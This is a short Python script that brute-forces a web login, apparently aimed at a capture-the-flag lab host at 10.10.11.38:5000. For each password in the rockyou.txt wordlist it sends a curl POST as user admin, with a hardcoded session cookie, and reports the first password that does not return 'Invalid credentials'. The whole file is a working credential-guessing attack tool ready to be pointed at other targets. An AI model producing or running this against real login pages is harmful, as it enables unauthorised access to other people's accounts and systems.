import subprocess
import threading
import pyfiglet

def bruteforce():
    # You can change the password wordlist but for now this is the default wordlist expecially for Kali Users 
    with open("/usr/share/wordlists/rockyou.txt", "r") as password_file:
        print(pyfiglet.figlet_format("Bruteforce started"))
        for password in password_file:
            password = password.strip()  # Remove any extra whitespace or newline characters
            print(f"Testing password: {password}")

        # Prepare the curl command with the current password
            curl_command = [
                "curl", "--path-as-is", "-i", "-s", "-k", "-X", "POST",
                "-H", "Host: 10.10.11.38:5000", #change this if needed
                "-H", "Content-Length: 29",
                "-H", "Cache-Control: max-age=0",
                "-H", "Accept-Language: en-US,en;q=0.9",
                "-H", "Origin: http://10.10.11.38:5000",
                "-H", "Content-Type: application/x-www-form-urlencoded",
                "-H", "Upgrade-Insecure-Requests: 1",
                "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
                "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "-H", "Referer: http://10.10.11.38:5000/login",
                "-H", "Accept-Encoding: gzip, deflate, br",
                "-H", "Connection: keep-alive",
                "-b", "session=eyJfZnJlc2giOmZhbHNlfQ.ZxSZVw.s2SXIZE1iorOAzNZFjL1zQDLf8c",
                f"--data-binary", f"username=admin&password={password}",
                "http://10.10.11.38:5000/login"
            ]

            try:
            # Execute the curl command
                result = subprocess.run(curl_command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Check if the response contains "Invalid credentials"
                if "Invalid credentials" in result.stdout.decode():
                    print(f"{password} is invalid")
                else:
                    print(f"This password works: {password}")
                    break  # Exit the loop once the correct password is found

            except subprocess.CalledProcessError as e:
                # Handle any errors during the subprocess call
                print(f"Error occurred while testing password {password}: {e}")

thread = threading.Thread(target=bruteforce)
thread.start()
                                  
